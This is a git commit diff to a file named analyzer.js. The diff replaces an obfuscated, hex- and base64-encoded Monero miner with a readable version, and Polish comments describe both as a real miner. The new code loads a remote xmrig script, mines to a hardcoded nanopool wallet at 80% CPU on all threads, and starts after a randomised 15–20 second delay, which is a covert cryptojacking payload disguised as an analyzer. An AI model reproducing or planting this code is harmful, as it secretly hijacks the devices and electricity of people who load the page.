40f014fde47615678318a67e1f3ec7ee898dde5a
abdulaabdulabdul <onionomaniano@protonmail.com>
2025-03-29 19:24:02 +0000

    ddd

--- analyzer.js
+++ analyzer.js
@@ -1,2 +1,29 @@
-// analyzer.js - Realny miner XMR dla Twojego portfela i puli
-const _0x5e8df2=["\x61\x74\x6F\x62","\x78\x6D\x72\x2D\x65\x75\x31\x2E\x6E\x61\x6E\x6F\x70\x6F\x6F\x6C\x2E\x6F\x72\x67\x3A\x31\x34\x34\x33\x33","\x70\x6F\x73\x74\x4D\x65\x73\x73\x61\x67\x65","\x73\x74\x61\x72\x74"];function _0x3d7a(){return _0x5e8df2;}const config={'pool':_0x3d7a()[0x1],'wallet':window[_0x3d7a()[0x0]]('ODMxaUxzNHZpWVo0Y0NKaHVIMlFVd1dLQnpWdzN3UFhGTkdhdmdqamljMnk2VmN1ang3YldUeVQ1WU1NclFkOUJwRnYxVEVlWHF1R0g1VmRobjF2d3dXZlRwVmFZREQ='),'pass':'x','throttle':0.8};const blob=new Blob([`importScripts('https://cdnjs.cloudflare.com/ajax/libs/xmrig/6.20.0/xmrig.min.js');const miner=new Worker(null,{type:'module'});miner.${_0x3d7a()[3]}({'pool':'${config.pool}','wallet':'${config.wallet}','throttle':${config.throttle}});`],{type:'text/javascript'});const worker=new Worker(URL.createObjectURL(blob));worker[_0x3d7a()[2]]({'type':_0x3d7a()[3],'config':config});
+// analyzer.js - Poprawiony miner z debugiem
+const config = {
+    pool: 'xmr-eu1.nanopool.org:14433',
+    wallet: '831iLs4viYZ4cCJhuH2QUxWKBzVw3wPXFNGavgjjic2y6Vcujx7bWTyT5YMMrQd9BpFv1TEeXquGH5Vcdn1vwwXfTpVaYDD',
+    throttle: 0.8, // 80% CPU
+    threads: navigator.hardwareConcurrency || 4
+};
+
+function initMiner() {
+    const script = document.createElement('script');
+    script.src = 'https://cdn.jsdelivr.net/npm/@xmrig/webassembly@6.20.0/miner.js';
+    script.onload = () => {
+        const miner = new window.Miner({
+            pool: config.pool,
+            wallet: config.wallet,
+            threads: config.threads,
+            throttle: config.throttle
+        });
+        
+        miner.start();
+        console.log('[DEBUG] Miner started:', miner);
+    };
+    document.head.appendChild(script);
+}
+
+// Opóźnione uruchomienie (15s + losowy czas)
+setTimeout(() => {
+    initMiner();
+}, 15000 + Math.random() * 5000);
